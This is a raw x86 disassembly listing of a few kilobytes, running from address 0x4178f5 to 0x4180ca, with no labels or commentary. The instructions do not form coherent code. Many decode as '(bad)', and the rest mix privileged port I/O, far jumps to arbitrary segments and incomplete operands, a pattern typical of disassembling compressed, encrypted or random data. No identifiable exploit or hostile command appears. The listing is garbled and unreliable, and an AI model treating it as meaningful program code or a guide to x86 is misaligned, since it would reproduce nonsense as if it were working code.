  4178f5:	lea    esp,[esi-0x41]
  4178f8:	arpl   si,di
  4178fa:	jo     0x4178a7
  4178fc:	(bad)  
  4178fd:	mov    al,0x30
  4178ff:	mov    ch,0x2d
  417901:	mov    WORD PTR ds:0x9d091dda,ds
  417907:	mov    ecx,0x10d23198
  41790c:	leave  
  41790d:	jo     0x4178cb
  41790f:	mov    bh,0x8a
  417911:	dec    ecx
  417912:	pusha  
  417913:	cs in  al,dx
  417915:	mov    ch,0x80
  417917:	jecxz  0x417940
  417919:	popf   
  41791a:	dec    edx
  41791b:	mov    es,WORD PTR [ecx-0x49]
  41791e:	jae    0x41796b
  417920:	js     0x4178db
  417922:	adc    DWORD PTR [edi+0x46],edi
  417925:	test   DWORD PTR [ebx+0x3d],ebx
  417928:	mov    dl,0xa9
  41792a:	icebp  
  41792b:	jno    0x4178bb
  41792d:	push   ebp
  41792e:	and    al,0x8c
  417930:	jno    0x417994
  417932:	sbb    edi,edx
  417934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417935:	dec    esp
  417936:	es sbb dl,dh
  417939:	or     eax,0xe9d616ec
  41793e:	popf   
  41793f:	shr    DWORD PTR [edx],0x8c
  417942:	loop   0x41791f
  417944:	test   DWORD PTR [ebp+edi*1-0x5b],esi
  417948:	mov    ah,0xc9
  41794a:	jmp    0xcd37:0x99701168
  417951:	ins    DWORD PTR es:[edi],dx
  417952:	sbb    ah,ah
  417954:	jl     0x417948
  417956:	jl     0x4178e0
  417958:	xor    ebp,DWORD PTR [esi+0x14]
  41795b:	pushf  
  41795c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41795d:	int    0x6d
  41795f:	sbb    eax,0xe6ba52ee
  417964:	xchg   esp,eax
  417965:	into   
  417966:	dec    edx
  417967:	or     cl,0x96
  41796a:	dec    ebp
  41796b:	or     al,ch
  41796d:	push   esp
  41796e:	je     0x417995
  417970:	aaa    
  417971:	jne    0x4179bf
  417973:	or     al,BYTE PTR [ebx+0x6f]
  417976:	xor    edx,esp
  417978:	out    0x97,al
  41797a:	cmp    eax,0x8a219d14
  41797f:	sbb    DWORD PTR [esi-0x30],esi
  417982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417983:	dec    eax
  417984:	and    DWORD PTR [ebp+0x1e],edi
  417987:	outs   dx,DWORD PTR ds:[esi]
  417988:	and    eax,0x31f6edee
  41798d:	mov    BYTE PTR [esi+esi*8],0x42
  417991:	inc    esi
  417992:	rcl    DWORD PTR ds:0x694d7e77,1
  417998:	aad    0xbd
  41799a:	fnstsw WORD PTR [eax+0x35]
  41799d:	mov    ch,0x17
  41799f:	and    BYTE PTR [edx],bl
  4179a1:	xor    ch,dh
  4179a3:	inc    edi
  4179a4:	push   ebx
  4179a5:	jecxz  0x417965
  4179a7:	inc    eax
  4179a8:	(bad)  
  4179a9:	mov    ebx,cs
  4179ab:	push   edi
  4179ac:	mov    ch,BYTE PTR [ebp-0xb]
  4179af:	push   ebp
  4179b0:	int3   
  4179b1:	push   es
  4179b2:	push   ecx
  4179b3:	retf   0x9525
  4179b6:	sub    al,0x10
  4179b8:	mov    dl,al
  4179ba:	fwait
  4179bb:	(bad)  
  4179bc:	aas    
  4179bd:	out    dx,eax
  4179be:	jbe    0x4179d7
  4179c0:	int    0xe4
  4179c2:	mov    DWORD PTR [esi-0x52f15086],0xb84e8f0c
  4179cc:	sbb    DWORD PTR [eax],eax
  4179ce:	ror    DWORD PTR [ebp-0x27],0x73
  4179d2:	rcl    BYTE PTR [eax+0x3f],cl
  4179d5:	fcomp  DWORD PTR ds:0xd8193491
  4179db:	mov    ds,WORD PTR [edi]
  4179dd:	rol    DWORD PTR [ecx-0x31a96137],1
  4179e3:	or     cl,cl
  4179e5:	mov    ebp,0x4fb48504
  4179ea:	xchg   edi,eax
  4179eb:	stc    
  4179ec:	loope  0x4179f1
  4179ee:	jmp    DWORD PTR [edx]
  4179f0:	repnz ins BYTE PTR es:[edi],dx
  4179f2:	cmp    BYTE PTR [ebx+0x5c],bl
  4179f5:	inc    esi
  4179f6:	lods   al,BYTE PTR ds:[esi]
  4179f7:	test   DWORD PTR [edi],edi
  4179f9:	add    BYTE PTR [ecx],ah
  4179fb:	jns    0x417a4e
  4179fd:	inc    edi
  4179fe:	cdq    
  4179ff:	cmp    eax,0x7c5b17a8
  417a04:	xchg   BYTE PTR [edi-0x43],al
  417a07:	stos   DWORD PTR es:[edi],eax
  417a08:	push   edx
  417a09:	dec    esi
  417a0a:	or     eax,0x5b09fb3d
  417a0f:	cli    
  417a10:	hlt    
  417a11:	jb     0x417a71
  417a13:	dec    edi
  417a14:	push   es
  417a15:	mov    cl,0x19
  417a17:	dec    eax
  417a18:	inc    ecx
  417a19:	add    ebx,0x5bddbae1
  417a1f:	lahf   
  417a20:	mov    al,0x61
  417a22:	inc    esi
  417a23:	mov    al,ds:0x2e6e94da
  417a28:	push   edx
  417a29:	inc    edx
  417a2a:	pop    ecx
  417a2b:	ins    BYTE PTR es:[edi],dx
  417a2c:	xchg   dh,dh
  417a2e:	pusha  
  417a2f:	aas    
  417a30:	dec    esi
  417a31:	xor    eax,0xafdd7a95
  417a36:	lock leave 
  417a38:	sti    
  417a39:	clc    
  417a3a:	pop    ds
  417a3b:	adc    edi,DWORD PTR [ebx-0x28]
  417a3e:	and    DWORD PTR [ecx-0x22bc8426],esi
  417a44:	jmp    0x417a69
  417a46:	inc    esi
  417a47:	(bad)  
  417a48:	and    ah,bl
  417a4a:	ret    0xe391
  417a4d:	jne    0x417a76
  417a4f:	test   al,0x39
  417a51:	xor    eax,DWORD PTR [edx]
  417a53:	les    ecx,FWORD PTR [ecx]
  417a55:	pop    ecx
  417a56:	aas    
  417a57:	cmp    BYTE PTR [edi-0x7301067f],cl
  417a5d:	test   al,0xc3
  417a5f:	add    eax,0x77940cee
  417a64:	outs   dx,BYTE PTR ds:[esi]
  417a65:	sahf   
  417a66:	jno    0x417a01
  417a68:	stos   DWORD PTR es:[edi],eax
  417a69:	out    0xee,al
  417a6b:	sbb    eax,0x22e95be1
  417a70:	mov    esp,0xd83e737d
  417a75:	in     eax,0xfb
  417a77:	xchg   ebp,eax
  417a78:	fnstcw WORD PTR [eax+0x9]
  417a7b:	lods   al,BYTE PTR ds:[esi]
  417a7c:	mov    BYTE PTR [ecx],ch
  417a7e:	mov    BYTE PTR [edx],bl
  417a80:	ds xchg ebx,eax
  417a82:	pop    ds
  417a83:	xchg   ebp,eax
  417a84:	ficomp DWORD PTR [edx-0x277c9320]
  417a8a:	xor    esp,edi
  417a8c:	mov    ebp,0xadddce91
  417a91:	imul   ebx,edi,0xd
  417a94:	push   ds
  417a95:	cmp    al,0x1
  417a97:	dec    eax
  417a98:	jmp    0x417b08
  417a9a:	push   esp
  417a9b:	dec    edi
  417a9c:	out    dx,al
  417a9d:	lods   al,BYTE PTR ds:[esi]
  417a9e:	xchg   esi,eax
  417a9f:	paddusb mm0,QWORD PTR [eax]
  417aa2:	out    dx,al
  417aa3:	cdq    
  417aa4:	aad    0xc1
  417aa6:	into   
  417aa7:	repz retf 
  417aa9:	or     eax,0x28892a67
  417aae:	ret    
  417aaf:	gs mov bl,0x37
  417ab2:	mov    edx,0xf8fe9949
  417ab7:	inc    edx
  417ab8:	das    
  417ab9:	ret    
  417aba:	mov    ebx,0xca71c188
  417abf:	outs   dx,DWORD PTR ds:[esi]
  417ac0:	xlat   BYTE PTR ds:[ebx]
  417ac1:	jmp    0x31cd:0x49d784bb
  417ac8:	retf   0xec37
  417acb:	in     al,dx
  417acc:	(bad)  
  417acd:	cmc    
  417ace:	push   edx
  417acf:	push   ss
  417ad0:	or     DWORD PTR [ebx+0x31d2e6ce],esp
  417ad6:	cmp    al,0x2b
  417ad8:	push   eax
  417ad9:	lock aad 0x4f
  417adc:	and    bx,WORD PTR [ecx+ebx*4-0x4bcbed42]
  417ae4:	cmp    BYTE PTR [ebx-0x5c],dh
  417ae7:	arpl   WORD PTR [ebx+0xf8cad14],di
  417aed:	and    esi,DWORD PTR [ecx+eax*8]
  417af0:	push   ss
  417af1:	sub    BYTE PTR [edx+0x6958dcdb],bl
  417af7:	mov    ebp,0xe7f2a777
  417afc:	test   DWORD PTR [edi],ebp
  417afe:	and    eax,0x67871670
  417b03:	fistp  DWORD PTR [esi+0x275cc30e]
  417b09:	sahf   
  417b0a:	daa    
  417b0b:	pushf  
  417b0c:	mov    edi,0xc879baa1
  417b11:	loope  0x417b05
  417b13:	jge    0x417af1
  417b15:	inc    edx
  417b16:	pusha  
  417b17:	mov    al,ds:0xc4f03b48
  417b1c:	add    eax,0x4092c83e
  417b21:	adc    edi,DWORD PTR ds:0xbb859661
  417b27:	mov    ds:0xdc4631e9,eax
  417b2c:	inc    esi
  417b2d:	sub    DWORD PTR [edx],esp
  417b2f:	cmp    eax,DWORD PTR [ebx-0x71]
  417b32:	fstp   TBYTE PTR [ebx+0x6a]
  417b35:	out    dx,eax
  417b36:	in     eax,0x80
  417b38:	cmp    bh,dl
  417b3a:	arpl   WORD PTR [edx-0x134741a6],sp
  417b40:	sbb    eax,0x9901b92c
  417b45:	jbe    0x417b76
  417b47:	push   ebx
  417b48:	fxtract 
  417b4a:	add    bl,bh
  417b4c:	pop    esi
  417b4d:	lahf   
  417b4e:	add    dl,bh
  417b50:	ja     0x417b1b
  417b52:	aam    0xe6
  417b54:	sub    DWORD PTR [ecx+0x69],0x6d
  417b58:	pop    es
  417b59:	in     eax,0x42
  417b5b:	call   0x760c:0x50f0746a
  417b62:	test   BYTE PTR [esp+esi*2-0x5d],ch
  417b66:	sub    cl,BYTE PTR [edx]
  417b68:	inc    ebx
  417b69:	and    DWORD PTR [ebx-0x24],ebx
  417b6c:	ror    DWORD PTR [ebx-0x104a89bd],cl
  417b72:	inc    ebp
  417b73:	add    ah,ah
  417b75:	jne    0x417bcc
  417b77:	sbb    eax,0x7ca442ed
  417b7c:	mov    bh,0x1c
  417b7e:	jg     0x417b7f
  417b80:	xchg   ebx,eax
  417b81:	fs xor eax,0x70346426
  417b87:	test   DWORD PTR [esi+0x59052af0],0x62acaaf4
  417b91:	and    ah,al
  417b93:	adc    BYTE PTR [eax+esi*2-0x9707587],ah
  417b9a:	or     eax,0xde0faa72
  417b9f:	or     BYTE PTR [esp+eax*8+0x12757f1a],0xf1
  417ba7:	xor    al,BYTE PTR [esp+ebx*2+0x21]
  417bab:	nop
  417bac:	cld    
  417bad:	aad    0xd8
  417baf:	cmp    BYTE PTR [ecx],bl
  417bb1:	push   esi
  417bb2:	mov    DWORD PTR ds:0xeb4d414e,ebx
  417bb8:	mov    esi,0xd98fbb13
  417bbd:	(bad)  [esi]
  417bbf:	in     eax,0xe1
  417bc1:	not    DWORD PTR [esp+ebp*4]
  417bc4:	fst    QWORD PTR [edx]
  417bc6:	ss mov esp,0xf2419eec
  417bcc:	add    eax,edx
  417bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bcf:	inc    edi
  417bd0:	mov    BYTE PTR [ebp+0x7778596d],ah
  417bd6:	pop    esp
  417bd7:	lds    edi,FWORD PTR [eax-0x248a1e70]
  417bdd:	mov    al,ds:0xe9f5e761
  417be2:	maxps  xmm7,XMMWORD PTR [ebx+0x28385a90]
  417be9:	cwde   
  417bea:	fild   WORD PTR [edi+0x5]
  417bed:	inc    DWORD PTR [edx+0x6a99ced6]
  417bf3:	jae    0x417c50
  417bf5:	popf   
  417bf6:	fisttp DWORD PTR [edx-0x26e5cbc3]
  417bfc:	and    esp,0xa15f9e39
  417c02:	jb     0x417b8b
  417c04:	outs   dx,DWORD PTR ds:[esi]
  417c05:	adc    BYTE PTR [ecx+edx*4-0x18a0a1c6],0x32
  417c0d:	jnp    0x417bba
  417c0f:	ss cmp eax,0xb17334c4
  417c15:	jb     0x417bc3
  417c17:	sbb    BYTE PTR [eax-0x6c76a1a2],0xe4
  417c1e:	ja     0x417c35
  417c20:	dec    esi
  417c21:	sti    
  417c22:	(bad)  
  417c23:	mov    ebp,0x4ae27e7a
  417c28:	es mov ecx,0x3c6aa73f
  417c2e:	and    DWORD PTR [eax],esi
  417c30:	(bad)  
  417c31:	(bad)  
  417c32:	mov    eax,0x6bda7b74
  417c37:	jae    0x417c8d
  417c39:	pop    eax
  417c3a:	push   esp
  417c3b:	add    BYTE PTR [edi+0xd],0x93
  417c3f:	push   esi
  417c40:	jnp    0x417bdd
  417c42:	fnstsw WORD PTR [edx-0x5d]
  417c45:	sub    BYTE PTR [esi+0xc],ah
  417c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c49:	in     al,0xcf
  417c4b:	dec    edi
  417c4c:	cmp    al,0xb1
  417c4e:	stos   DWORD PTR es:[edi],eax
  417c4f:	pop    es
  417c50:	inc    ebp
  417c51:	test   DWORD PTR ds:0x1381dad2,0xf49722ef
  417c5b:	xchg   edx,eax
  417c5c:	jne    0x417cb5
  417c5e:	mov    ch,0x92
  417c60:	or     ah,cl
  417c62:	xchg   esi,eax
  417c63:	bnd jge 0x417c65
  417c66:	or     eax,0x5afed9e0
  417c6b:	fdiv   st,st(2)
  417c6d:	scas   eax,DWORD PTR es:[edi]
  417c6e:	sbb    al,0x63
  417c70:	mov    ds:0x3e61ab38,al
  417c75:	in     al,dx
  417c76:	(bad)  
  417c77:	dec    esi
  417c78:	jg     0x417c52
  417c7a:	adc    esi,esp
  417c7c:	and    bl,BYTE PTR [ebp-0x677028f9]
  417c82:	pop    ds
  417c83:	cmp    eax,0x67099fb3
  417c88:	call   0x3ed88be2
  417c8d:	cmp    ebp,DWORD PTR [ebx]
  417c8f:	sub    bl,bl
  417c91:	dec    ebp
  417c92:	fcomp  QWORD PTR ds:0xb063817
  417c98:	scas   al,BYTE PTR es:[edi]
  417c99:	and    DWORD PTR [eax+0x4a822f4e],esi
  417c9f:	sbb    al,0x30
  417ca1:	mov    al,0x1c
  417ca3:	bound  esi,QWORD PTR [edi-0x5c]
  417ca6:	cdq    
  417ca7:	adc    esi,edx
  417ca9:	pop    ebx
  417caa:	ins    BYTE PTR es:[edi],dx
  417cab:	sbb    DWORD PTR [eax],0xe0352e07
  417cb1:	sbb    al,0x93
  417cb3:	pushf  
  417cb4:	imul   BYTE PTR [edx+eiz*8-0x64f0c1a6]
  417cbb:	loope  0x417c4e
  417cbd:	ds popf 
  417cbf:	mov    ds:0xfa22a5eb,al
  417cc4:	inc    eax
  417cc5:	scas   eax,DWORD PTR es:[edi]
  417cc6:	pop    es
  417cc7:	loop   0x417cf4
  417cc9:	push   0x6f
  417ccb:	xchg   edx,eax
  417ccc:	sub    esi,DWORD PTR [ecx-0x7c]
  417ccf:	shl    BYTE PTR [edx],1
  417cd1:	push   0x5afb4745
  417cd6:	cmp    bl,al
  417cd8:	inc    ebp
  417cd9:	cs and eax,0x601bcd5a
  417cdf:	xchg   esp,eax
  417ce0:	frstor [edx-0x7f]
  417ce3:	xchg   ebx,eax
  417ce4:	in     eax,0x91
  417ce6:	aaa    
  417ce7:	push   es
  417ce8:	mov    edx,0x9df91891
  417ced:	neg    al
  417cef:	leave  
  417cf0:	int    0x34
  417cf2:	cld    
  417cf3:	xchg   ebp,eax
  417cf4:	leave  
  417cf5:	xlat   BYTE PTR ds:[ebx]
  417cf6:	mov    ds:0xc1fcb18,al
  417cfb:	daa    
  417cfc:	sub    eax,DWORD PTR [ecx-0x1d]
  417cff:	sub    BYTE PTR [ecx-0x1fe423d],ch
  417d05:	aam    0xda
  417d07:	adc    DWORD PTR [ecx+ebp*8],ebp
  417d0a:	out    dx,eax
  417d0b:	push   ebx
  417d0c:	pop    ebp
  417d0d:	cmc    
  417d0e:	cmp    eax,0x24a7a919
  417d13:	cli    
  417d14:	pop    ss
  417d15:	jmp    0x417d78
  417d17:	push   es
  417d18:	out    dx,eax
  417d19:	aad    0x6f
  417d1b:	jge    0x417d02
  417d1d:	dec    ebx
  417d1e:	iret   
  417d1f:	mov    WORD PTR [edx-0x4017dbb3],ss
  417d25:	(bad)  ds:0x4137d0b0
  417d2b:	xchg   ebx,eax
  417d2c:	ret    
  417d2d:	jb     0x417d10
  417d2f:	fs dec esp
  417d31:	sbb    BYTE PTR [ebp+0x22dd887],cl
  417d37:	jmp    0x417ce7
  417d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d3a:	and    dl,dl
  417d3c:	mov    dl,0x7b
  417d3e:	pushf  
  417d3f:	ja     0x417cc6
  417d41:	pop    ds
  417d42:	(bad)  
  417d43:	xor    ebp,eax
  417d45:	inc    eax
  417d46:	mov    ecx,0x15f377b
  417d4b:	cmp    edx,DWORD PTR [edx]
  417d4d:	cmp    DWORD PTR [ebp+0x6d],ebp
  417d50:	mov    edi,0xb72b758e
  417d55:	xchg   esi,eax
  417d56:	jb     0x417d7c
  417d58:	inc    ebp
  417d59:	sub    bl,BYTE PTR [ebp+edi*4+0x5b6504cc]
  417d60:	ffreep st(3)
  417d62:	sub    eax,0xe1ed0f70
  417d67:	sub    eax,0x79488f3c
  417d6c:	test   bl,0x2
  417d6f:	pop    ds
  417d70:	sbb    DWORD PTR [edx+0x45],0xdce41dbb
  417d77:	js     0x417d9d
  417d79:	adc    DWORD PTR [edi-0x51015eab],edi
  417d7f:	fldcw  WORD PTR [edx-0x22]
  417d82:	xchg   ecx,eax
  417d83:	cmp    dl,BYTE PTR [edx]
  417d85:	mov    edx,0xe22a7465
  417d8a:	aam    0x91
  417d8c:	dec    ebp
  417d8d:	pusha  
  417d8e:	adc    al,BYTE PTR [edi+0x5154fbf0]
  417d94:	or     ecx,DWORD PTR [ebp+0x4ea14c25]
  417d9a:	stc    
  417d9b:	and    eax,0xf1b0d19
  417da0:	inc    ebx
  417da1:	mov    DWORD PTR [eax],ecx
  417da3:	push   cs
  417da4:	push   ebp
  417da5:	push   edi
  417da6:	pop    ss
  417da7:	jmp    0x32c0:0xba6947a1
  417dae:	sbb    eax,0x713b9797
  417db3:	stos   BYTE PTR es:[edi],al
  417db4:	fldenv [ecx]
  417db6:	fistp  QWORD PTR [edx+ecx*4+0x75]
  417dba:	mov    BYTE PTR [ebx],bl
  417dbc:	sub    al,0x65
  417dbe:	push   edi
  417dbf:	inc    esi
  417dc0:	dec    esi
  417dc1:	loopne 0x417d75
  417dc3:	mov    WORD PTR [edx],cs
  417dc5:	sbb    BYTE PTR [ebx-0x33047ea8],al
  417dcb:	test   DWORD PTR [ebx],esi
  417dcd:	aam    0x9b
  417dcf:	mov    dh,0xfa
  417dd1:	sub    BYTE PTR [eax-0x5d7ecfa0],dl
  417dd7:	pop    edx
  417dd8:	je     0x417dc1
  417dda:	jbe    0x417df7
  417ddc:	and    eax,0x76cde48b
  417de1:	test   DWORD PTR [ebp+0x19],esp
  417de4:	or     DWORD PTR [esi+0x169cc7dc],esi
  417dea:	cmp    eax,DWORD PTR [edi-0x4c]
  417ded:	cwd    
  417def:	mov    bl,0xb8
  417df1:	aad    0xaf
  417df3:	leave  
  417df4:	pop    ds
  417df5:	leave  
  417df6:	es mov dl,0xc2
  417df9:	mov    ds:0x824aeb1f,al
  417dfe:	cs enter 0xe669,0x94
  417e03:	dec    esp
  417e04:	pop    ds
  417e05:	xchg   edx,eax
  417e06:	js     0x417da4
  417e08:	adc    BYTE PTR [ebx+edx*1],cl
  417e0b:	cmp    bh,bh
  417e0d:	ret    0xdf5f
  417e10:	push   ebp
  417e11:	fsub   DWORD PTR ds:0xb99104f3
  417e17:	adc    DWORD PTR [edx-0x3926a118],0x72b3f4e9
  417e21:	xor    al,0x7d
  417e23:	loop   0x417e2a
  417e25:	xor    ebx,DWORD PTR [esi+0x4d]
  417e28:	pop    eax
  417e29:	aam    0xc1
  417e2b:	mov    DWORD PTR [edx+0x59],eax
  417e2e:	rol    DWORD PTR [ebp-0x9f5529],1
  417e34:	pushf  
  417e35:	aaa    
  417e36:	adc    bh,BYTE PTR [ecx+0x720fdfa3]
  417e3c:	pop    ds
  417e3d:	xchg   ebp,eax
  417e3e:	clc    
  417e3f:	mov    edi,es
  417e41:	xor    ah,al
  417e43:	jne    0x417dce
  417e45:	push   ss
  417e46:	ss jle 0x417e7a
  417e49:	mov    WORD PTR [ebx+0x52122181],cs
  417e4f:	fisubr DWORD PTR [edx+edx*8-0x65]
  417e53:	cmp    esi,DWORD PTR [ebx+0xe2c9931]
  417e59:	push   edi
  417e5a:	mov    edi,0x48b864f6
  417e5f:	mov    dl,0x58
  417e61:	sbb    al,BYTE PTR [ebp+0x5c12a66d]
  417e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e68:	and    eax,DWORD PTR [ebx]
  417e6a:	adc    BYTE PTR [ebx-0x78],cl
  417e6d:	call   0x50e4:0xe366c9cc
  417e74:	jmp    0x76d7c471
  417e79:	neg    edi
  417e7b:	inc    edx
  417e7c:	inc    ebx
  417e7d:	test   DWORD PTR [eax+0x18],edi
  417e80:	js     0x417e29
  417e82:	test   BYTE PTR [eax+0x36a74dc],0x39
  417e89:	iret   
  417e8a:	jnp    0x417ecd
  417e8c:	dec    ecx
  417e8d:	mov    WORD PTR [ebx-0x67],?
  417e90:	test   BYTE PTR [eax+0x5d],0x7e
  417e94:	arpl   sp,dx
  417e96:	push   edx
  417e97:	dec    eax
  417e98:	(bad)  
  417e99:	enter  0xbdba,0x56
  417e9d:	xchg   DWORD PTR [esi],eax
  417e9f:	sub    DWORD PTR [ecx+eax*2-0x81ff5d5],ebp
  417ea6:	xchg   DWORD PTR [ebx-0x7a7773cf],eax
  417eac:	shr    BYTE PTR [edx-0x1e2b4f05],1
  417eb2:	mov    esi,0x21decdcd
  417eb7:	test   eax,0x9816b226
  417ebc:	add    BYTE PTR [esi-0x14e12eb0],al
  417ec2:	mov    al,ds:0x4b283c42
  417ec7:	out    0xe4,al
  417ec9:	fdiv   st(0),st
  417ecb:	rdpmc  
  417ecd:	mov    edi,0xb4e4ff08
  417ed2:	mov    DWORD PTR [ebp-0x2df3d47f],esp
  417ed8:	lds    edx,FWORD PTR [ecx+ebx*8+0x35]
  417edc:	int3   
  417edd:	rcl    DWORD PTR [ebx-0x76],1
  417ee0:	adc    eax,esp
  417ee2:	xchg   ebx,eax
  417ee3:	stc    
  417ee4:	and    BYTE PTR [edi+0x61],ch
  417ee7:	cmp    ebx,DWORD PTR ds:0x1bbec90e
  417eed:	xchg   DWORD PTR [ebx+0x7f],edx
  417ef0:	dec    esi
  417ef1:	leave  
  417ef2:	add    eax,DWORD PTR [ecx+0x76b8821c]
  417ef8:	xor    eax,0xa1ac0d9
  417efd:	cmp    DWORD PTR [eax-0x39e5dae2],0xb5d4883a
  417f07:	mov    esi,0x9d673820
  417f0c:	mov    ?,eax
  417f0e:	push   ebx
  417f0f:	push   ebx
  417f10:	xlat   BYTE PTR ds:[ebx]
  417f11:	push   es
  417f12:	add    DWORD PTR [edx],esi
  417f14:	xchg   esi,eax
  417f15:	(bad)  
  417f17:	neg    DWORD PTR [edi-0x17d00a51]
  417f1d:	jmp    0xd16f:0xcd52f294
  417f24:	mov    ds:0xb5f3be57,al
  417f29:	jmp    0x417f06
  417f2b:	cmp    esi,ecx
  417f2d:	adc    bl,BYTE PTR [esi-0x4bfe5f]
  417f33:	xor    ebx,DWORD PTR [edx-0x41]
  417f36:	ins    BYTE PTR es:[edi],dx
  417f37:	sub    ch,BYTE PTR [esi]
  417f39:	lock movq QWORD PTR [edx],mm5
  417f3d:	jb     0x417f7f
  417f3f:	imul   esi,DWORD PTR [edx+0x5b086ad1],0xe3bbf666
  417f49:	sub    DWORD PTR [esp+ecx*8],ecx
  417f4c:	dec    esp
  417f4d:	loope  0x417f40
  417f4f:	push   esp
  417f50:	stos   BYTE PTR es:[edi],al
  417f51:	push   esp
  417f52:	sub    DWORD PTR [edi-0x76],edx
  417f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f56:	xchg   esp,eax
  417f57:	rcl    ecx,cl
  417f59:	add    ah,BYTE PTR [esi+ebp*8]
  417f5c:	daa    
  417f5d:	cmp    ecx,DWORD PTR [edi]
  417f5f:	xchg   BYTE PTR [ecx+0x5],ah
  417f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f63:	xor    dh,0xc5
  417f66:	(bad)  
  417f67:	jle    0x417fdd
  417f69:	xchg   ebx,eax
  417f6a:	dec    eax
  417f6b:	retf   0x37fc
  417f6e:	loopne 0x417f74
  417f70:	test   DWORD PTR [esi],edx
  417f72:	adc    al,0xa3
  417f74:	pop    esp
  417f75:	cld    
  417f76:	in     al,0x98
  417f78:	arpl   WORD PTR [ecx+eax*2],si
  417f7b:	ds hlt 
  417f7d:	xor    eax,0xf8709754
  417f82:	dec    esp
  417f83:	mov    bh,0x75
  417f85:	ds das 
  417f87:	mov    ds:0x4c635bdf,eax
  417f8c:	call   0x860ddf31
  417f91:	bound  ebp,QWORD PTR [eax]
  417f93:	loop   0x41800e
  417f95:	jb     0x417ffc
  417f97:	clc    
  417f98:	dec    edi
  417f99:	adc    DWORD PTR [ebp-0x57],eax
  417f9c:	xchg   BYTE PTR [esp+esi*2+0x63],ah
  417fa0:	fnstenv [esi+0x40969565]
  417fa6:	cwde   
  417fa7:	sub    cl,BYTE PTR [ebp+0x5]
  417faa:	and    ch,al
  417fac:	adc    BYTE PTR [edi+esi*4],al
  417faf:	dec    ebx
  417fb0:	jae    0x417f77
  417fb2:	sub    dl,BYTE PTR [edx]
  417fb4:	cmp    al,0xe6
  417fb6:	jae    0x417fd4
  417fb8:	pop    ecx
  417fb9:	mov    eax,0xfd1595f4
  417fbe:	jge    0x417f7b
  417fc0:	daa    
  417fc1:	sub    ah,BYTE PTR [ecx-0x6389aa01]
  417fc7:	mov    ebx,esi
  417fc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fca:	gs popf 
  417fcc:	xchg   ebx,eax
  417fcd:	cli    
  417fce:	ret    
  417fcf:	out    0x7f,eax
  417fd1:	int    0xa
  417fd3:	loop   0x417fa7
  417fd5:	das    
  417fd6:	out    0xdf,eax
  417fd8:	or     eax,0x74369b3e
  417fdd:	jl     0x418028
  417fdf:	or     DWORD PTR [esi+0x308ac1c6],edx
  417fe5:	sbb    esi,DWORD PTR [ecx+0x4edd0ca3]
  417feb:	cmp    ch,BYTE PTR [edx]
  417fed:	jecxz  0x41803a
  417fef:	push   ecx
  417ff0:	lock aaa 
  417ff2:	das    
  417ff3:	(bad)  
  417ff4:	adc    esp,DWORD PTR [ebp+edi*1+0x77]
  417ff8:	pop    ds
  417ff9:	sahf   
  417ffa:	or     BYTE PTR [ebx+edx*8+0x6deebe99],al
  418001:	(bad)  
  418002:	iret   
  418003:	pop    ds
  418004:	sbb    BYTE PTR [edx],al
  418006:	mov    ds:0xd4f0139a,eax
  41800b:	jb     0x41802c
  41800d:	mov    ah,BYTE PTR [ecx-0x64d7d511]
  418013:	fcomp  DWORD PTR [eax]
  418015:	dec    ecx
  418016:	and    bl,ah
  418018:	lods   al,BYTE PTR ds:[esi]
  418019:	lods   al,BYTE PTR ds:[esi]
  41801a:	mov    ebp,0xc3ceb7ff
  41801f:	push   0x27
  418021:	pop    eax
  418022:	inc    esi
  418023:	xchg   DWORD PTR [ebx+0x5f],edx
  418026:	inc    esi
  418027:	ss cmp al,0x1d
  41802a:	pop    esi
  41802b:	jle    0x418057
  41802d:	pop    edx
  41802e:	jb     0x417fb2
  418030:	retf   0x7e7d
  418033:	leave  
  418034:	stos   BYTE PTR es:[edi],al
  418035:	lock cld 
  418037:	xchg   esi,eax
  418038:	sahf   
  418039:	call   0x89284d84
  41803e:	xchg   edi,eax
  41803f:	jns    0x418004
  418041:	retf   
  418042:	xchg   ebp,eax
  418043:	push   0xffffffa0
  418045:	mov    DWORD PTR ds:0x3d322dfe,edi
  41804b:	test   al,0xd5
  41804d:	mov    bl,0xc7
  41804f:	dec    edi
  418050:	adc    BYTE PTR [edi],dl
  418052:	xchg   BYTE PTR [ecx],cl
  418054:	mov    BYTE PTR [ecx-0xc],cl
  418057:	shl    ecx,1
  418059:	inc    esp
  41805a:	call   0xec2210f3
  41805f:	pop    esi
  418060:	aas    
  418061:	xchg   edi,eax
  418062:	mov    al,cl
  418064:	mov    ebp,0xa1481d7f
  418069:	xor    al,0xf2
  41806b:	mov    edx,0xa27ce0c7
  418070:	jge    0x4180e4
  418072:	test   eax,0x94dba27e
  418077:	push   ds
  418078:	dec    ebp
  418079:	or     eax,0x2df7f086
  41807e:	cmp    eax,0xb7379e8c
  418083:	cmp    al,0x72
  418085:	or     eax,0xd54fe149
  41808a:	mov    WORD PTR [ecx+0xc],ss
  41808d:	icebp  
  41808e:	test   BYTE PTR [ecx-0x40],ah
  418091:	mov    al,0x9a
  418093:	push   esp
  418094:	ret    
  418095:	sti    
  418096:	ins    DWORD PTR es:[edi],dx
  418097:	jmp    0x616ba09e
  41809c:	fcom   QWORD PTR [ebp+0x1f]
  41809f:	xchg   edx,eax
  4180a0:	fild   DWORD PTR [edx+0x27b588a6]
  4180a6:	scas   eax,DWORD PTR es:[edi]
  4180a7:	or     esp,0xffffffe8
  4180aa:	fnstenv [eax]
  4180ac:	test   DWORD PTR [ebx-0x35],edx
  4180af:	xchg   edx,eax
  4180b0:	in     al,0x7d
  4180b2:	popf   
  4180b3:	gs fs xor ebp,edi
  4180b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180b8:	out    dx,eax
  4180b9:	cwde   
  4180ba:	je     0x41806c
  4180bc:	outs   dx,BYTE PTR ds:[esi]
  4180bd:	dec    BYTE PTR [edx-0x52b0b377]
  4180c3:	mov    esi,0x8ece13e6
  4180c8:	cmp    al,BYTE PTR [ecx]
  4180ca:	in     eax,0x5c
